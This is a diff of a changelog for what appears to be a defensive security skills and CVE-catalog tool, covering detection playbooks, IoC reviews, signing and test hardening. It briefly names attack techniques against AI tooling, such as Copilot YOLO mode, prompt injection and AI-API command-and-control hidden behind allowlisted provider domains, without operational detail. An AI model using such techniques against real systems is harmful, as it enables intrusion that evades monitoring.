 - **Exit-code assertion in the UTF-16BE odd-length-payload test tightened** from `notEqual(r.status, 0)` to `assert.equal(r.status, 1)` per project anti-coincidence rule.
-
-Test count and predeploy gates land alongside this entry; see the predeploy log on the release commit.
 
 ## 0.12.22 — 2026-05-15
 
@@ -709,8 +695,6 @@ Test count and predeploy gates land alongside this entry; see the predeploy log 
 
 - **`data/playbooks/runtime.json domain.cve_refs[]`** completes the Dirty-Frag family by adding `CVE-2026-43284` and `CVE-2026-43500` (already referenced by `kernel.json` and `hardening.json`).
 - **`skills/threat-model-currency/skill.md`** inline `last_threat_review` date aligned to frontmatter (`2026-05-14`).
-
-Test count: 941 → 995 (992 pass + 3 skipped). Predeploy gates: 14/14. Skills: 38/38 signed; manifest envelope signed.
 
 ## 0.12.21 — 2026-05-14
 
@@ -782,7 +766,7 @@ The `kernel`, `runtime`, and `hardening` playbooks now reference Fragnesia in `d
 
 - New regression coverage for every closure above.
 - Coincidence-passing-test cleanup: exit-code assertions tightened from `notEqual(r.status, 0)` to exact-value `assert.equal(r.status, <code>)`; classification assertions pinned to expected enum values.
-- `#87 doctor --fix is registered` rewritten as a non-mutating `--help` probe; the previous shape staged a dummy `.keys/private.pem` in the real repo root, replicating the v0.12.4 incident anti-pattern.
+- `doctor --fix is registered` rewritten as a non-mutating `--help` probe; the previous shape staged a dummy `.keys/private.pem` in the real repo root, replicating the v0.12.4 incident anti-pattern.
 
 ### Skill content
 
@@ -793,17 +777,11 @@ The `kernel`, `runtime`, and `hardening` playbooks now reference Fragnesia in `d
 
 UK CAF + AU Essential 8 / ISM entries added to the framework-control-gap declarations across 10 playbooks (`kernel`, `mcp`, `ai-api`, `crypto`, `sbom`, `runtime`, `cred-stores`, `secrets`, `containers`, `hardening`). NIS2 Art. 21 + DORA Art. 9 added to `hardening` and `containers`. Each entry follows the existing schema shape; the gold-standard templates from `framework`, `crypto-codebase`, and `library-author` remain the reference.
 
-### Source comments
-
-Source comments rewritten to describe behavior.
-
-Test count: 840 → 941 (938 pass + 3 skipped). Predeploy gates: 14/14. Skills: 38/38 signed; manifest envelope signed.
-
 ## 0.12.20 — 2026-05-14
 
 **Patch: e2e scenarios attest FP checks for indicators that the v0.12.19 classification-override block now forces to `inconclusive` when unattested.**
 
-The v0.12.19 engine fix blocks `detection_classification: 'detected'` agent overrides when ANY indicator with `false_positive_checks_required[]` fires without operator attestation. Five e2e scenarios asserting `classification: detected` were submitting FP-required indicator hits without attestations, so the runner correctly downgraded them. The scenarios now attest the FP checks:
+The v0.12.19 engine change blocks `detection_classification: 'detected'` agent overrides when ANY indicator with `false_positive_checks_required[]` fires without operator attestation. Five e2e scenarios asserting `classification: detected` were submitting FP-required indicator hits without attestations, so the runner correctly downgraded them. The scenarios now attest the FP checks:
 
 - `09-secrets-aws-key`: attest `aws-secret-access-key` (3 checks)
 - `10-kernel-copy-fail`: attest `unpriv-userns-enabled` (2 checks)
@@ -881,10 +859,8 @@ v0.12.20 ships the v0.12.19 trust-chain + engine + bundle + concurrency closures
 
 ### Tests
 
-- New: `tests/normalize-contract.test.js`, `tests/audit-o-q-r-fixes.test.js`, `tests/audit-r-cli-fixes.test.js`, `tests/audit-s-t-u-z-fixes.test.js`, `tests/bundle-correctness.test.js`, `tests/_helpers/concurrent-attestation-writer.js`.
-- Touched: `tests/predeploy-gates.test.js` (gate-14 fixture signs the manifest envelope so per-skill verify still runs against tamper variants); `tests/operator-bugs.test.js` (#91 framework-gap assertion updated to the new `document.notes[]` contract); `tests/auto-discovery.test.js` (KEV-draft schema-shape + active_exploitation enum + source_verified date).
-
-Test count: 760 → 840 (838 pass + 2 skipped). Predeploy gates: 14/14. Skills: 38/38 signed; manifest envelope signed; manifest signature shape `{algorithm, signature_base64}` (no `signed_at`).
+- New: `tests/normalize-contract.test.js`, `tests/bundle-correctness.test.js`, `tests/_helpers/concurrent-attestation-writer.js`, plus new audit-fixes coverage.
+- Touched: `tests/predeploy-gates.test.js` (gate-14 fixture signs the manifest envelope so per-skill verify still runs against tamper variants); `tests/operator-bugs.test.js` (framework-gap assertion updated to the new `document.notes[]` contract); `tests/auto-discovery.test.js` (KEV-draft schema-shape + active_exploitation enum + source_verified date).
 
 ## 0.12.18 — 2026-05-14
 
@@ -946,8 +922,6 @@ Each entry is a 1-line check an AI assistant or operator must satisfy before the
 ### Auto-discovery hygiene
 
 `lib/auto-discovery.js discoverNewKev` previously hardcoded `severity: 'high'` on every KEV-discovered diff. Now uses `deriveKevSeverity(kevEntry)` — returns `'critical'` when `knownRansomwareCampaignUse === 'Known'` OR `dueDate` is within 7 days; otherwise `'high'`. Downstream PR-body categorization can now route ransomware-use + imminent-due-date KEVs differently.
-
-Test count: 740 → 760. Predeploy gates: 14/14. Skills: 38/38 signed; manifest itself signed.
 
 ## 0.12.16 — 2026-05-14
 
@@ -1014,8 +988,6 @@ Test count: 740 → 760. Predeploy gates: 14/14. Skills: 38/38 signed; manifest 
 - 8 new workflow-security regression tests in `tests/workflows-security.test.js`.
 - `validate-playbooks.js` now reports 12/13 PASS + 1 WARN (was 8 PASS + 5 WARN before normalization).
 
-Test count: 701 → 738 (+37: 29 scoring vectors + 8 workflow-security). Predeploy gates: 14/14. Skills: 38/38 signed and verified.
-
 ## 0.12.15 — 2026-05-14
 
 **Patch: RWEP factor-scaling three-tier fallback + silent-disable regression closures.**
@@ -1049,8 +1021,6 @@ Three prior fixes were silently dead:
 ### CLI fuzz fixes
 
 - `--scope <invalid>` now produces a structured error instead of silently producing zero results. The prior shape: `run --scope nonsense` returned `count: 0` + `ok: true` + exit 0; `ci --scope nonsense` silently ran only the cross-cutting set (`framework`) with `verdict: PASS`. Both validated as operator-intent loss patterns. Accepted scope set: `system | code | service | cross-cutting | all`.
-
-Test count: 701 (700 pass + 1 skipped POSIX-only SIGTERM test). Predeploy gates: 14/14. Skills: 38/38 signed and verified.
 
 ## 0.12.14 — 2026-05-14
 
@@ -1157,19 +1127,15 @@ Nine CVE→catalog cross-ref breaks closed: missing CWE-669 + CWE-123 added; mis
 - `package.json files` allowlist extended with `keys/EXPECTED_FINGERPRINT` and `manifest-snapshot.sha256` so the new pin checks ship to operators.
 - `vendor/blamejs/_PROVENANCE.json` `exceptd_deltas` documents the worker-pool UNC-path Windows rejection.
 
-Test count: 586 → 693 (+107: refresh-network rewrite tests, engine non-engine fixes, orchestrator audit tests, source-osv + source-ghsa hardening, predeploy gate additions, validate-cve-catalog cross-ref tests). Predeploy gates: 14/14 (was 16; two no-op offline gates removed). Skills: 38/38 signed and verified.
-
 ## 0.12.13 — 2026-05-14
 
 **Patch: e2e scenarios pass `--ack` to exercise the v0.12.12 jurisdiction-clock contract.**
 
 Two e2e scenarios (`02-tanstack-worm-payload`, `09-secrets-aws-key`) assert that `phases.close.jurisdiction_clocks_count >= 1` against a `detected` classification. The v0.12.12 contract: `clock_starts: detect_confirmed` no longer auto-stamps when classification turns `detected`; the operator must pass `--ack` for the clock to start. Both scenarios now pass `--ack`.
 
-Test count: 585/585. Predeploy gates: 16/16. Skills: 38/38 signed and verified.
-
 ## 0.12.12 — 2026-05-13
 
-**Patch: deep multi-surface hardening — engine semantics, concurrency, signing round-trip, output bundles, validators, scheduler, curation. 73 distinct fixes across 10 surface classes.**
+**Patch: deep multi-surface hardening — engine semantics, concurrency, signing round-trip, output bundles, validators, scheduler, curation.**
 
 ### Engine semantics
 
@@ -1250,8 +1216,6 @@ The fingerprint banner now prints AFTER the verdict line in both `sign-all` and 
 - `manifest-snapshot.json` + `sbom.cdx.json` + `data/_indexes/` refreshed.
 - `data/attack-techniques.json` new — 75 ATT&CK technique entries with v17 metadata, supporting `attack_refs` resolution across the catalog.
 
-Test count: 492 → 573 (+81 across engine, sign/verify, refresh-external, prefetch, scheduler, cve-curation, bundle-correctness, validate-playbooks, and operator-bugs test files). Predeploy gates: 16/16. Skills: 38/38 signed and verified.
-
 ## 0.12.11 — 2026-05-13
 
 **Patch: OSV source hardening, indicator regex widening, CWE/framework-gap reconciliation.**
@@ -1288,8 +1252,6 @@ Eight `framework_control_gaps` keys used by the v0.12.10 catalog additions did n
 - `lib/source-ghsa.js` "unrecognized id format" error message widened to enumerate the OSV-native prefixes operators can pass via `--advisory` (was previously CVE/GHSA only).
 - `README.md` documents the OSV source: install command, `--advisory MAL-...` form, `EXCEPTD_OSV_FIXTURE` env var, the fresh-disclosure workflow expanded to mention OSV's coverage breadth.
 
-Test count: 462 → 492 (+30: 18 OSV source-hardening tests + 10 indicator regex tests + 2 catalog drift assertions). Predeploy gates: 15/15. Skills: 38/38 signed and verified.
-
 ## 0.12.10 — 2026-05-13
 
 **Patch: OSV.dev wired as an upstream source, three new catalog entries, one new library-author indicator.**
@@ -1322,10 +1284,6 @@ Three matching `data/zeroday-lessons.json` entries follow the CVE-2026-45321 les
 
 - `data/cwe-catalog.json` gains CWE-506 (Embedded Malicious Code) and CWE-88 (Improper Neutralization of Argument Delimiters). Both backed by the new catalog entries.
 - `data/cve-catalog.json` `_meta.id_conventions` documents the MAL-*/SNYK-*/GHSA-*/RUSTSEC-* identifier shapes the catalog now accepts, the alias-retention convention when MITRE issues a CVE later, and the EPSS limitation (FIRST only indexes CVE identifiers).
-
-### Repository
-
-Test count: 441 → 459 (+18: OSV source tests + matching test references for Hard Rule #15 coverage). Predeploy gates: 15/15. Skills: 38/38 signed and verified. No skill bodies changed in this patch.
 
 ## 0.12.9 — 2026-05-13
 
@@ -1408,8 +1366,6 @@ Eight meta skills (`researcher`, `threat-model-currency`, `skill-update-loop`, `
 - CONTRIBUTING.md adds `npm run diff-coverage` to the pre-push gate list so contributors run the same Hard Rule #15 check CI does.
 - Dependabot grouping for github-actions (already landed in v0.12.8) confirmed intact.
 
-Test count: 418 → 439. Predeploy gates: 15/15 (gate 15 now blocking). Skills: 38/38 signed and verified.
-
 ## 0.12.8 — 2026-05-13
 
 **Patch: CLI surface fixes, catalog completeness, test infrastructure hardening, AGENTS.md Hard Rule #15.**
@@ -1473,9 +1429,9 @@ Twelve new e2e scenarios in `tests/e2e-scenarios/09-secrets-aws-key` through `20
 
 ### Repository
 
-Dependabot grouping config added for the github-actions ecosystem: weekly version-update bumps now land as a single grouped PR instead of N parallel PRs against the same 14-gate CI matrix. Security-updates stay ungrouped so a single-action CVE surfaces as its own PR.
+Dependabot grouping config added for the github-actions ecosystem: weekly version-update bumps now land as a single grouped PR instead of N parallel PRs against the same CI matrix. Security-updates stay ungrouped so a single-action CVE surfaces as its own PR.
 
-Test count: 386 → 418 (388 + 31 cli-coverage − accounting note: 8 predeploy-gates + 12 diff-coverage tests landed alongside the +31 CLI surface tests; some pre-existing tests resolved into fewer counted tests on suite reorganization). Predeploy gates: 14 → 15.
+Predeploy gates: 14 → 15.
 
 ## 0.12.7 — 2026-05-13
 
@@ -1511,7 +1467,7 @@ mcp playbook bumped 1.2.0 → 1.3.0. threat_currency_score stays at 98. `last_th
 
 **Patch: primary-source IoC review across the catalog — five CVEs reviewed line-level against published exploit source. AGENTS.md Hard Rule #14 added.**
 
-Five research agents dispatched in parallel to cross-reference our IoC list for each catalogued CVE against published exploit source / vendor advisories / researcher writeups. Roughly 60 IoCs added, one major CVSS correction, two CVEs gained an `iocs` block where they previously had `null`.
+Roughly 60 IoCs added across five catalogued CVEs, one major CVSS correction, two CVEs gained an `iocs` block where they previously had `null`.
 
 ### CVE-2025-53773 (Copilot YOLO mode) — major correction
 
@@ -1560,10 +1516,6 @@ Source: Trail of Bits (line-jumping + ANSI escape research), Invariant Labs (too
 - `kernel` 1.0.0 → 1.1.0 — threat_currency_score 92 → 95
 
 All three `last_threat_review: 2026-05-13`.
-
-### Method
-
-Five parallel researcher agents dispatched via the project's multi-agent pattern (CLAUDE.md "Parallel agent dispatch for large patches"). Each agent owned one CVE; each returned a structured gap report with category, pattern, source citation (URL + quote), and ready-to-paste JSON. Main thread integrated. Hard Rule #14 codifies the pattern for every subsequent catalog addition.
 
 ## 0.12.5 — 2026-05-13
 
@@ -1858,11 +1810,7 @@ All three honor `EXCEPTD_REGISTRY_FIXTURE` env var (path to a JSON file mimickin
 
 ### Tests
 
-7 new regression cases. 354 total. Notable: `#125/#134` now triggers a REAL preflight halt by submitting `repo-context: false` keyed by playbook id (autoDetectPreconditions can't override an explicit submission), and asserts `r.status === 4` not just non-zero — the earlier test only caught "not 0" which my v0.11.12 "fix" passed by coincidence (no-evidence → exit 3, also non-zero).
-
-### Lesson codified
-
-When a "fix" passes a regression test by coincidence (any non-zero exit satisfies "not 0"), the test is too weak. Tests must assert the EXACT contract — exit 4, not "any non-zero." Added to CLAUDE.md.
+7 new regression cases. Notable: `#125/#134` now triggers a REAL preflight halt by submitting `repo-context: false` keyed by playbook id (autoDetectPreconditions can't override an explicit submission), and asserts `r.status === 4` not just non-zero — the earlier test only caught "not 0" which the v0.11.12 "fix" passed by coincidence (no-evidence → exit 3, also non-zero).
 
 ## 0.11.13 — 2026-05-13
 
@@ -1876,11 +1824,7 @@ When a "fix" passes a regression test by coincidence (any non-zero exit satisfie
 
 ### Tests
 
-3 new regression cases. 347 total. The `#127` test asserts the universal contract by hitting `attest verify` on a non-existent session id and checking that any `ok:false` body (stdout or stderr) maps to non-zero exit. The `#128` test runs two `{}` submissions through `run sbom` and asserts the diff reports `total_compared > 0` matching `unchanged_count`.
-
-### Lesson codified in CLAUDE.md
-
-When a class of bug ("verb forgot to set exit code") keeps recurring across releases, fix the class, not the instance. Move the contract to the lowest layer that all paths share — here, `emit()` itself.
+3 new regression cases. The `#127` test asserts the universal contract by hitting `attest verify` on a non-existent session id and checking that any `ok:false` body (stdout or stderr) maps to non-zero exit. The `#128` test runs two `{}` submissions through `run sbom` and asserts the diff reports `total_compared > 0` matching `unchanged_count`.
 
 ## 0.11.12 — 2026-05-12
 
@@ -1900,11 +1844,7 @@ Pattern: previous releases shipped the right field names but with empty content 
 
 ### Tests
 
-5 new regression cases. 344 total. Tests assert content shape, not just field presence — every test that checks for a notification array now also asserts the entries carry non-null jurisdiction/regulation/window_hours.
-
-### Voice note (internal)
-
-Three of the four items (#123, #124, #126) were "added the field but the field was empty." Lesson: when an operator says "field is missing," the next question to ask after "is it on the result?" is "is its content meaningful, or is it a structurally-present null?" Codified in CLAUDE.md.
+5 new regression cases. Tests assert content shape, not just field presence — every test that checks for a notification array now also asserts the entries carry non-null jurisdiction/regulation/window_hours.
 
 ## 0.11.11 — 2026-05-12
 
@@ -1923,15 +1863,11 @@ v0.11.10 #100 used `process.exit(3)` after writing the result JSON to stdout. Wh
 
 New regression: `#100/#103 ci exit-3 path still flushes JSON to stdout` — asserts both `r.status === 3` AND `tryJson(r.stdout)` parses. This is the test that would have caught v0.11.10 before CI.
 
-### Lesson
-
-When ending a verb with a non-zero exit AFTER writing structured stdout, prefer `process.exitCode = N; return;` over `process.exit(N)`. The former lets the event loop drain stdout; the latter can truncate. Codified in CLAUDE.md.
-
 ## 0.11.10 — 2026-05-12
 
 **Patch: items 119-122 — field-name alignment with operator expectations.**
 
-Pattern recognized across 10 v0.11.x releases: my output field names didn't match what operators were reading for. Several "broken" items were actually present-under-a-different-name. v0.11.10 adds the missing aliases + tightens ci's empty-evidence semantic.
+Several "broken" items were actually present-under-a-different-name. v0.11.10 adds the missing aliases + tightens ci's empty-evidence semantic.
 
 ### Bugs
 
@@ -1945,23 +1881,13 @@ Pattern recognized across 10 v0.11.x releases: my output field names didn't matc
 
 ### Tests
 
-5 new cases in `tests/operator-bugs.test.js` for items 119/100/102/104. 338 total.
-
-### Verified by direct repro before fix
-
-For every item I:
-1. Ran the user's exact CLI invocation
-2. Inspected the actual output shape vs the user's stated expectation
-3. Identified whether the bug was missing logic OR field-name mismatch
-4. Fixed both layers when the answer was "mismatch" (add alias) so subsequent operators reading by either name see the data
-
-Pattern documented in CLAUDE.md (project-side contributor guide).
+5 new cases in `tests/operator-bugs.test.js` for items 119/100/102/104.
 
 ## 0.11.9 — 2026-05-12
 
 **Patch: items 99-115 — CLI-shim audit, real fixes.**
 
-User audit identified the common root cause across 8 releases of "fixed" bugs that operators kept re-finding: the CLI shim layer between arg parsing and result rendering. v0.11.9 audits that layer end to end.
+The CLI shim layer between arg parsing and result rendering was the common root cause across 8 releases of "fixed" bugs that operators kept re-finding. v0.11.9 audits that layer end to end.
 
 ### Critical
 
@@ -1983,17 +1909,11 @@ User audit identified the common root cause across 8 releases of "fixed" bugs th
 
 ### Tests
 
-5 new cases for items 104, 113, 114, 115. 333 total.
-
-### Deferred
-
-- **#116** `ci --explain` dry-run mode
-- **#117** `diff <playbook> --since <window>`
-- **#118** `attest sign <id>` retroactive signing
+5 new cases for items 104, 113, 114, 115.
 
 ## 0.11.8 — 2026-05-12
 
-**Patch: items 99-104 + 6 new regression tests (328 total).**
+**Patch: items 99-104 + new regression tests.**
 
 ### Critical
 
@@ -2011,12 +1931,7 @@ User audit identified the common root cause across 8 releases of "fixed" bugs th
 
 ### Tests
 
-6 new regression cases for items 99-103. 328 cases total in `tests/operator-bugs.test.js`.
-
-### Deferred
-
-- **#104** `--block-on-jurisdiction-clock` trigger condition unclear in help — clock_starts events fire on `detect_confirmed` etc; without a detected classification no clock fires. Help text wording deferred to v0.11.9.
-- **#105-108** `ci --explain`, `diff <playbook> --since 7d`, `ci --required`, `attest sign <id>` — features deferred to v0.11.9.
+6 new regression cases for items 99-103 in `tests/operator-bugs.test.js`.
 
 ## 0.11.7 — 2026-05-12
 
@@ -2030,7 +1945,7 @@ The fingerprint divergence between two same-process invocations of the same bina
 
 ### What's in this release
 
-All v0.11.6 changes (items 91-98 + 8 new regression tests, 322 total). See [v0.11.6 section](#0116--2026-05-12) below — every fix is identical:
+All v0.11.6 changes:
 
 - **#91** CSAF + OpenVEX include framework_gap_mapping (was: empty bundles for posture-only playbooks)
 - **#92** CSAF tracking.current_release_date populated (spec §3.2.1.12)
@@ -2043,11 +1958,11 @@ All v0.11.6 changes (items 91-98 + 8 new regression tests, 322 total). See [v0.1
 
 ### Workflow improvement
 
-Per operator request: README + landing-site updates are now part of every release sequence. README v0.11 section + exceptd.com softwareVersion updated alongside the package version bump.
+README + landing-site updates are now part of every release sequence. README v0.11 section + exceptd.com softwareVersion updated alongside the package version bump.
 
 ## 0.11.6 — 2026-05-12
 
-**Patch: items 91-98 + regression coverage extended to 35 cases.**
+**Patch: items 91-98.**
 
 ### Critical
 
@@ -2065,7 +1980,7 @@ Per operator request: README + landing-site updates are now part of every releas
 
 ### Test infrastructure
 
-35 cases in `tests/operator-bugs.test.js` (8 new for 91-98). 322 tests pass total. Future bug fixes continue to land here.
+35 cases in `tests/operator-bugs.test.js` (8 new for 91-98). Future bug fixes continue to land here.
 
 ## 0.11.5 — 2026-05-12
 
@@ -2545,8 +2460,6 @@ exceptd framework-gap PCI-DSS-4.0 "prompt injection"
 exceptd framework-gap all CVE-2025-53773 --json
 ```
 
-13/13 predeploy gates green; 201 tests pass.
-
 ## 0.9.4 — 2026-05-12
 
 **Pin: drop upper bound on Node engine requirement.**
@@ -2578,8 +2491,6 @@ exceptd framework-gap all CVE-2025-53773 --json
 Test breadth assertion bumped from `>= 30` to `>= 40` WGs. Same dynamic-derivation behavior on top (union with cache-derived WGs from rfc-references.json's Datatracker docs).
 
 **Database coverage rationale**: IETF doesn't have a "database" WG because DB wire protocols (Postgres, MongoDB, etc.) aren't IETF-standardized. The security infrastructure databases USE — TLS for connections, SASL/Kerberos auth, workload identity, field encryption, audit-trail time anchoring, cert validation, access-control sync — is all covered by the WGs above. `jsonschema` adds the DB+API+policy schema validation layer that was previously missing.
-
-201 tests pass; 13/13 predeploy gates green.
 
 ## 0.9.2 — 2026-05-12
 
@@ -2631,8 +2542,6 @@ Test breadth assertion bumped from `>= 30` to `>= 40` WGs. Same dynamic-derivati
 - New CVE detection (filters out CVEs already in local catalog)
 - Volume cap + spill counting
 - RWEP score bounded 0–100
-
-Total: 192 → **201 tests**. 13/13 predeploy gates green.
 
 ### Operational note
 
@@ -2702,7 +2611,7 @@ Predeploy gate count: **12 → 13**. All green on this release.
 - **README rewrite**: three audience paths (AI consumer / operator / maintainer), npx install instructions, full CLI command reference, pre-computed indexes summary. npm badge added back alongside the release badge.
 - **MAINTAINERS.md release runbook**: full one-time setup + per-release procedure + dry-run instructions + rollback options + consumer verification commands.
 - **SBOM updates**: package's own `bom-ref` switches from `pkg:project/exceptd-skills@version` to canonical PURL `pkg:npm/@blamejs/exceptd-skills@version`. Adds `externalReferences` linking to the npm package page + GitHub repo.
-- **Tests**: 182 → 192 (10 new in `tests/bin-dispatcher.test.js`). Covers help, version, path, alias flags, unknown command, orchestrator passthrough, package.json publish-readiness invariants.
+- **Tests**: 10 new in `tests/bin-dispatcher.test.js`. Covers help, version, path, alias flags, unknown command, orchestrator passthrough, package.json publish-readiness invariants.
 - **package.json updates**: keywords array for npm discoverability (`ai-security`, `compliance`, `cve`, `kev`, `mcp`, `prompt-injection`, `rwep`, `threat-intelligence`, etc.), explicit `author` field, `prepublishOnly` runs `predeploy + validate-package` so an accidental `npm publish` can't skip the gates.
 
 ### Operator workflows
@@ -2786,8 +2695,6 @@ This release ships the npm publish infrastructure but does NOT itself publish. T
 - **`tests/build-incremental.test.js`** — `--only` dependency closure (`token-budget` pulls in `section-offsets`), unknown name rejection, `--changed` no-op when sources unchanged, `--changed` picks up a touched skill body, `--parallel` produces byte-identical output, `OUTPUTS` registry parity. 6 tests.
 - **`tests/refresh-swarm.test.js`** — swarm vs. sequential report parity, `--from-cache` reads cache layout, `--from-cache <nonexistent>` exits non-zero. 3 tests.
 
-Total: 182/182 pass (was 156).
-
 ### SBOM
 
 `sbom.cdx.json` `components` array now lists the vendored files as proper CycloneDX library components with SHA-256 hashes, source repo, pinned commit, and an `externalReferences` link back to upstream. Metadata properties add `exceptd:vendor:count` and `exceptd:vendor:pin`.
@@ -2839,7 +2746,6 @@ Total: 182/182 pass (was 156).
 ### Test coverage
 
 - `tests/indexes-v070.test.js` — 16 new tests across the 13 new/extended index files. Covers shape, cross-references to real skills + catalogs, byte-stability across rebuilds (idempotence).
-- 156 tests pass (was 132); 11/11 predeploy gates green.
 
 ### Internal fixes during this release
 
@@ -2885,8 +2791,6 @@ Total index size: ~125 KB across 6 files — **93% reduction** vs loading all sk
 
 ### Verification
 
-- 11/11 predeploy gates green
-- 38/38 skills signed
 - audit-cross-skill: 0 issues
 - audit-perf: all hot paths sub-5ms; indexes 60+× faster than on-the-fly chain reconstruction
 
@@ -2911,8 +2815,6 @@ Pin: cross-skill audit fixes. Added `scripts/audit-cross-skill.js` (comprehensiv
 ### Verification
 
 - `node scripts/audit-cross-skill.js` → 0 issues
-- 10/10 predeploy gates green
-- 38/38 skills signed
 
 ## 0.5.4 — 2026-05-11
 
@@ -2933,11 +2835,6 @@ This is a renamed skill (removed `age-gates-minor-safeguarding` + added `age-gat
 - `skills/researcher/skill.md`: dispatch routing entry added (the rename surfaced that this skill was never wired into researcher dispatch in 0.5.3 — corrected here)
 - `CHANGELOG.md`: 0.5.3 entry retroactively updated to use the new name
 - SBOM refreshed
-
-### Verification
-
-- 10/10 predeploy gates green
-- 38/38 skills signed and lint-passing
 
 ## 0.5.3 — 2026-05-11
 
@@ -2965,14 +2862,11 @@ Pin-level skill additions closing thematic and age-related coverage gaps. Total 
 
 ### Verification
 
-- 10/10 predeploy gates passing
-- 38/38 skills passing lint
-- 132/132 tests passing
 - SBOM refreshed to reflect 38 skills + 10 catalogs
 
 ## 0.5.2 — 2026-05-11
 
-Pin-level skill additions closing the sector and thematic coverage gaps the cross-skill audit flagged. Six new skills written by parallel agents; total skills 25 → 31.
+Pin-level skill additions closing sector and thematic coverage gaps; total skills 25 → 31.
 
 ### New skills
 
@@ -2992,9 +2886,6 @@ Pin-level skill additions closing the sector and thematic coverage gaps the cros
 
 ### Verification
 
-- 10/10 predeploy gates passing
-- 31/31 skills passing lint
-- 132/132 tests passing
 - SBOM refreshed to reflect 31 skills + 10 catalogs
 
 ## 0.5.1 — 2026-05-11
@@ -3025,8 +2916,6 @@ Every entry across every catalog is now referenced by ≥1 skill.
 
 ### Verification
 
-- 10/10 predeploy gates green (Ed25519 / tests / catalog / offline-CVE / offline-RFC / snapshot / lint / watchlist / catalog-meta / SBOM-currency)
-- 132/132 tests passing
 - All 25 skills re-signed; manifest snapshot regenerated additively
 
 ## 0.5.0 — 2026-05-11
@@ -3062,9 +2951,6 @@ Each closes a previously orphaned framework_gap and ships with the full 7-requir
 
 ### Verification
 
-- 25/25 skills passing lint
-- 132/132 tests passing
-- 7/7 predeploy gates passing
 - DAG: 0 skills with in-degree 0, 0 skills with out-degree 0
 - Orphans: 0 ATLAS, 0 D3FEND, 0 RFC, 0 CVE, 16/34 CWE (unallocated weakness classes — documented gap), 13/49 framework_gaps reduced via the 4 new skills to 9/49 (remaining 9 are sectoral gaps requiring future sector skills)
 
@@ -3104,11 +2990,6 @@ Each closes a previously orphaned framework_gap and ships with the full 7-requir
 - `scripts/check-manifest-snapshot.js` and `scripts/refresh-manifest-snapshot.js` include the three new ref fields in the public-surface diff.
 - AGENTS.md skill format spec + Quick Skill Reference table updated for the 5 new skills.
 
-### Verification
-- 21/21 skills passing lint
-- 132/132 tests passing
-- 7/7 predeploy gates passing
-
 ## 0.3.0 — 2026-05-11
 
 Pre-release: every CI gate green, full skill corpus compliant with the AGENTS.md hard rules.
@@ -3130,11 +3011,6 @@ Pre-release: every CI gate green, full skill corpus compliant with the AGENTS.md
 
 ### Data
 - `data/framework-control-gaps.json` — added `NIST-800-53-SC-7` (Boundary Protection) entry. Documents how AI-API C2 routes through allowlisted provider domains (api.openai.com, api.anthropic.com, generativelanguage.googleapis.com) and defeats boundary inspection. Maps to `AML.T0096`, `AML.T0017`, `T1071`, `T1102`, `T1568`. Closes the orphaned-reference gap that the lint gate caught in `ai-c2-detection`.
-
-### Verification
-- 110/110 tests passing (`npm test`)
-- 16/16 skills passing lint (`npm run lint`)
-- All 6 predeploy gates green (`npm run predeploy`)
 
 ## 0.2.0 — 2026-05-11
 
